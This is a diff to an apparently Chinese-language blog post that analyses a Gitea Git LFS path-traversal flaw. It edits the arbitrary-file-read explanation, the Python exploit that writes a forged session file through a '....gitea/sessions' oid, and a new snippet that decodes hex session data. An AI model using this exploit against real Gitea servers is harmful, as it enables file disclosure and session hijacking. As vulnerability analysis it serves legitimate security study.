@@ -243,7 +243,7 @@ func (s *ContentStore) Get(meta *models.LFSMetaObject, fromByte int64) (io.ReadC
 
 <p>可以看到<code>transformKey()</code>方法是把key参数做了三次分割，先取两个字符，加上<code>/</code>，然后再取两个，再加上<code>/</code>，最后拼接后面部分，举例说明：</p>
 
-<p><code>abcdefgh -&gt; ab\cd\efgh</code></p>
+<p><code>abcdefgh -&gt; ab/cd/efgh</code></p>
 
 <p>于是此处就可以构造<code>..../etc/passwd</code>的格式，经过<code>transformKey()</code>后被转换成<code>../../etc/passwd</code>，这样就存在一个任意文件读取漏洞。</p>
 
@@ -574,7 +574,7 @@ func main() {
     }
 
     url = '%s.git/info/lfs/objects' % (GIT_URL)
-    response = s.post(
+    response = session.post(
         url,
         json=data,
         headers={
@@ -598,7 +598,7 @@ func main() {
     oid = '....gitea/sessions/1/1/11session'
     url = '%s.git/info/lfs/objects/%s' % (GIT_URL, urllib.quote(oid, safe=''))
     print url
-    response = s.put(url, data=gen_data(), headers={
+    response = session.put(url, data=gen_data(), headers={
         'Accept': 'application/vnd.git-lfs',
         'Content-Type': 'application/vnd.git-lfs',
         'Authorization': 'Bearer ' + AUTH_TOKEN
@@ -613,7 +613,13 @@ func main() {
     time.sleep(300)
 </code></pre>
 
-<h5 id="6-修改cookie">6. 修改cookie</h5>
+<p><code>HEX_DATA</code>是生成的<code>session</code>数据</p>
+
+<pre><code class="language-python">HEX_DATA = '0eff81040102ff8...d696e313233'	//hex_data
+SESSION_DATA = HEX_DATA.decode('hex')
+</code></pre>
+
+<h5 id="6-修改session">6. 修改Session</h5>
 
 <p><img src="https://ob5vt1k7f.qnssl.com/1531905605099.png" alt="1531905605099" /></p>
 
